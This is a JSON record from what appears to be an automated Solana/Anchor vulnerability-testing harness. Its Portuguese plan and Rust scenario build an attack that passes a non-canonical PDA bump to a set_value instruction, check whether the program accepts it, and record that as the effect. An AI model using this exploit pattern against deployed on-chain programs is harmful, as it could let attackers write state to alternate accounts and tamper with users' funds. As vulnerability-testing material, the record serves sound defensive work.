attempts.raw:
{
  "plan": "Preparamos uma conta DataAccount no PDA canonico derivado de [b"data", user] com bump canonico, e um usuario signer. O baseline chama set_value com o bump canonico e um valor legitimo, provando que o cenario esta correto. O ataque chama set_value com um bump nao-canonico que ainda produz um PDA valido, mas diferente do canonico, passando uma conta DataAccount existente nesse endereco alternativo. O efeito mede se o programa aceitou o bump nao-canonico e gravou o estado na conta de endereco alternativo, comparando o bump armazenado com o bump canonico.",
  "scenario": "let user = Pubkey::new_unique();
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

// Encontra um bump nao-canonico que ainda produza um PDA valido
let mut alt_bump: Option<u8> = None;
let mut alt_pda: Option<Pubkey> = None;
for b in (0u8..=255).rev() {
    if b == canonical_bump {
        continue;
    }
    if let Ok(p) = Pubkey::create_program_address(&[b"data", user.as_ref(), &[b]], &env.program_id) {
        alt_bump = Some(b);
        alt_pda = Some(p);
        break;
    }
}

let alt_bump = match alt_bump {
    Some(b) => b,
    None => return,
};
let alt_pda = match alt_pda {
    Some(p) => p,
    None => return,
};

// Conta DataAccount no PDA canonico (estado inicial legitimo)
let canonical_data = anchor_account_data(
    "DataAccount",
    &[
        ("user", user),
        ("value", 0u64),
        ("bump", canonical_bump),
    ],
);
let canonical_account = account(&env.program_id, &canonical_data, None);

// Conta DataAccount no PDA alternativo (endereco diferente do canonico)
let alt_data = anchor_account_data(
    "DataAccount",
    &[
        ("user", user),
        ("value", 0u64),
        ("bump", alt_bump),
    ],
);
let alt_account = account(&env.program_id, &alt_data, None);

let user_account = wallet(1_000_000_000);

// Baseline: uso legitimo com o bump canonico
let baseline_ix = env.anchor_ix(
    "set_value",
    &(canonical_bump, 42u64),
    vec![
        AccountMeta::new(canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let baseline_accounts = vec![
    (canonical_pda, canonical_account.clone()),
    (user, user_account.clone()),
];
let baseline_result = env.baseline(
    "set_value legitimo com bump canonico",
    &baseline_ix,
    &baseline_accounts,
);

// Ataque: bump nao-canonico apontando para o PDA alternativo
let attack_ix = env.anchor_ix(
    "set_value",
    &(alt_bump, 1337u64),
    vec![
        AccountMeta::new(alt_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let attack_accounts = vec![
    (alt_pda, alt_account),
    (user, user_account),
];
let attack_result = env.attack(
    "set_value com bump nao-canonico em PDA alternativo",
    &attack_ix,
    &attack_accounts,
);

if attack_result.program_result == ProgramResult::Success {
    let stored_bump = after(&attack_result, &alt_pda).data()[72];
    let stored_value = read_u64(after(&attack_result, &alt_pda).data(), 40);
    env.effect(
        "bump nao-canonico aceito e estado gravado em PDA alternativo",
        stored_bump == alt_bump && stored_bump != canonical_bump && stored_value == 1337u64,
    );
}"
}

